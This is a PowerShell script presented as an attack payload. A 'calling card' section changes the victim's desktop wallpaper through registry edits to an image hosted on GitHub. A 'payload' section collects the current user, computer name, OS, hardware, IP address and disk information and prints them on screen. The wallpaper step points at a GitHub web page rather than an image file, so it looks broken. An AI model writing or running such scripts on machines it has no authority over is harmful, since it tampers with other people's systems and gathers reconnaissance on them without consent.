# leaving a calling card
$imagePath = "https://github.com/jakearmitage1337/SuperSecretProject/blob/main/Jake_Armitage.jpg"

$registryKeyPath = "HKCU:\Control Panel\Desktop"
$registryValueName = "Wallpaper"

Set-ItemProperty -Path $registryKeyPath -Name $registryValueName -Value $imagePath

rundll32.exe user32.dll, UpdatePerUserSystemParameters

Set-ItemProperty -Path $registryKeyPath -Name "WallpaperStyle" -Value "2" # 2 = Stretch, 0 = Tile, 6 = Fit
Set-ItemProperty -Path $registryKeyPath -Name "TileWallpaper" -Value "0" # 0 = No Tile, 1 = Tile

rundll32.exe user32.dll, UpdatePerUserSystemParameters

# payload
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name


$computerName = $env:COMPUTERNAME
$osVersion = [System.Environment]::OSVersion.VersionString
$osArchitecture = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture
$processor = (Get-WmiObject -Class Win32_Processor).Name
$totalMemory = [math]::round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
$ipAddress = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -notmatch '^169\.'}).IPAddress


$disks = Get-WmiObject Win32_LogicalDisk -Filter "DriveType = 3" | ForEach-Object {
    [PSCustomObject]@{
        Drive       = $_.DeviceID
        FreeSpaceGB = [math]::round($_.FreeSpace / 1GB, 2)
        SizeGB      = [math]::round($_.Size / 1GB, 2)
    }
}

Write-Host "User Information:"
Write-Host "-----------------"
Write-Host "Current User: $currentUser"
Write-Host ""
Write-Host "System Information:"
Write-Host "------------------"
Write-Host "Computer Name: $computerName"
Write-Host "OS Version: $osVersion"
Write-Host "OS Architecture: $osArchitecture"
Write-Host "Processor: $processor"
Write-Host "Total Physical Memory (GB): $totalMemory"
Write-Host "IP Address: $ipAddress"
Write-Host ""
Write-Host "Disk Information:"
Write-Host "----------------"
$disks | ForEach-Object {
    Write-Host "Drive: $($_.Drive) - Free Space (GB): $($_.FreeSpaceGB) - Total Size (GB): $($_.SizeGB)"
}
